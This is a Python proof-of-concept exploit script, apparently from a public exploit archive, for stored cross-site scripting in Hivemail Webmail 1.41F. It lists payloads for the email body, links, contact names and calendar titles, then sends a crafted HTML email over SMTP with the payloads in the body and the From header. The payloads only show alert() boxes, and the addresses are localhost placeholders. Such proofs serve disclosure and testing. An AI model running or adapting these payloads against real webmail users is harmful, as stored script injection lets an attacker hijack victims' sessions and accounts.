#!/usr/bin/python


'''

# Exploit Title: Hivemail Webmail Multiple Stored XSS issues
# Date: 16/08/2012
# Exploit Author: Shai rod (@NightRang3r)
# Vendor Homepage: http://www.hivemail.com/
# Software Link: http://www.hivemail.com/data/HM_1_41F_103.rar
# Version: 1.41F Build 103
 
#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar


Vulnerability Description
=========================

1. Stored XSS in email body.

XSS Payload: <img src='1.jpg'onerror=javascript:alert("XSS")>

Send an email to the victim with the payload in the message body.
XSS Will be triggered when victim opens the message.


2. Stored XSS in e-mail body (HREF).

XSS Payload: <a href=javascript:alert("AnotherXSS")>Click Me</a>

Send an email to the victim with the payload in the email body, once the user clicks on the link the XSS should be triggered.


3. Stored XSS in contacts.

XSS Payload: <img src='1.jpg'onerror=javascript:alert("XSS")>


Create a new contact with the XSS payload in the contact name field, XSS will be triggered each time user view his contacts.


4. Stored XSS in calendar.

XSS Payload: <img src='1.jpg'onerror=javascript:alert("XSS")>

Create a new event and in the event title insert your XSS payload, XSS will be triggered when you view your calendar.


'''


import smtplib

print "###############################################"
print "#      Hivemail Webmail 1.41F StoredXSS       #"
print "#            Coded by: Shai rod               #"
print "#               @NightRang3r                  #"
print "#           http://exploit.co.il              #"
print "#       For Educational Purposes Only!        #"
print "###############################################\r\n"

# SETTINGS

sender = "attacker@localhost"
smtp_login = sender
smtp_password = "qwe123"
recipient = "victim@localhost"
smtp_server  = "localhost"
smtp_port = 25
subject = "Hivemail Webmail XSS POC"
xss_payload = """<img src='1.jpg'onerror=javascript:alert("XSS")>"""

# SEND E-MAIL

print "[*] Sending E-mail to " + recipient + "..."
msg = ("From: " + xss_payload + "%s\r\nTo: %s\r\nSubject: %s\n"
       % (sender, ", ".join(recipient), subject) )
msg += "Content-type: text/html\n\n"
msg += xss_payload
msg += """<a href=javascript:alert("XSS")>Click Me, Please...</a>\r\n"""
server = smtplib.SMTP(smtp_server, smtp_port)
server.ehlo()
server.starttls()
server.login(smtp_login, smtp_password)
server.sendmail(sender, recipient, msg)
server.quit()
print "[+] E-mail sent!"
